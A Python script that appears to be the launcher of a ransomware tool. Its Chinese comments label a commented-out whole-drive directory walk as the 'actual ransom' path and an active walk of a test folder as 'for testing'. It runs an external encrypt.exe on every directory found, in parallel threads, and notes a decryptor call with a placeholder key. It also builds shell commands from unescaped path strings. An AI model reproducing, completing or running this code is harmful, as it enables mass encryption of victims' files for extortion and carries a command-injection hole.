import subprocess
import os 
import sys
import threading
import time

CUR_PATH = os.path.dirname(sys.executable) if hasattr(sys, 'frozen') else os.path.dirname(__file__)
TEST_PATH = os.path.dirname(CUR_PATH)

def getfilename():
    fileList = []
    # for root, dirs, files in os.walk("..\\"*100+"..", topdown=False):      # 实际勒索
    for root, dirs, files in os.walk(TEST_PATH+"/test", topdown=False):      # 用于测试
        for name in dirs:
            fileList.append(os.path.join(root, name+'/'))
    return fileList

def encryexe(file='', command=''):
    proc = subprocess.Popen(file+' '+command, stdout=subprocess.PIPE,
                            stdin=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            shell=True)  
    print(file, command, '执行完毕', time.ctime())

def encrypt_file():
    # 获取盘符
    # d = os.popen("wmic VOLUME GET Label, Name").read()
    # print(d)
    # print(type(d))
    p = []
    fileList = getfilename()
    print(fileList)
    for index,i in enumerate(fileList):
        p.append(threading.Thread(target=encryexe, args=(CUR_PATH+'/encrypt.exe', i,)))
        # p.append(multiprocessing.Process(target=encryexe, args=('de.exe', i+' 11111111111111111111111111111111 1111111111111111',)))
        p[index].deamon = True
        p[index].start()

if __name__ == '__main__':
    encrypt_file()